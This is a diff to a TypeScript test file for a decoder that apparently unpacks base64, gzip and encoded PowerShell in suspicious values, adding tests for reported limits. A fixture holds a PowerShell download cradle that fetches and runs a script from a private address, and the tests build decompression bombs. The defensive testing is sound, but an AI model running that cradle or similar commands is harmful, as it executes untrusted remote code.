@@ -1,6 +1,6 @@
 import { deflateRawSync, gzipSync } from 'node:zlib';
 import { describe, expect, it } from 'vitest';
-import { DECODED_PARTS, decodings, encodedParts, SCANNED_LIMIT } from '../src/explore/decode';
+import { decodeAll, DECODED_PARTS, decodings, encodedParts, SCANNED_LIMIT } from '../src/explore/decode';
 
 const base64 = (text: string, encoding: BufferEncoding = 'utf8') => Buffer.from(text, encoding).toString('base64');
 const SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")';
@@ -83,5 +83,22 @@ describe('a value crafted to exhaust the page', () => {
   it('looks for encoded parts only near the start of a huge value', () => {
     const tail = base64('found only past the scanned part of the value');
     expect(encodedParts(`${'x '.repeat(SCANNED_LIMIT)}${tail}`)).toEqual([]);
+  });
+});
+
+describe('what a crafted value keeps from being decoded', () => {
+  it('is said, never left out silently', async () => {
+    const many = Array.from({ length: 40 }, (_, i) => base64(`message number ${i} long enough to be base64`)).join(' ');
+    expect((await decodeAll(many)).incomplete).toEqual([expect.stringMatching(/24 more encoded-looking parts were not tried/)]);
+    const bombs = Array.from({ length: 10 }, (_, i) => gzipSync(Buffer.from(`${i}`.padEnd(1024 * 1024, 'A'))).toString('base64')).join(' ');
+    expect((await decodeAll(bombs)).incomplete).toContainEqual(expect.stringMatching(/stopped after 4 MiB/));
+    expect((await decodeAll(`${'x '.repeat(SCANNED_LIMIT)}`)).incomplete).toEqual([expect.stringMatching(/first 512 KiB/)]);
+    expect((await decodeAll(base64('a plain message, long enough to count'))).incomplete).toEqual([]);
+  });
+
+  it('tries an encoded command before the junk in front of it', async () => {
+    const junk = Array.from({ length: 80 }, (_, i) => Buffer.from(Array.from({ length: 24 }, (_, k) => (i * 31 + k * 7) % 256)).toString('base64')).join(' ');
+    const [first] = await decodings(`${junk} powershell -enc ${base64(SCRIPT, 'utf16le')}`);
+    expect(first).toMatchObject({ label: 'PowerShell -EncodedCommand', text: SCRIPT });
   });
 });
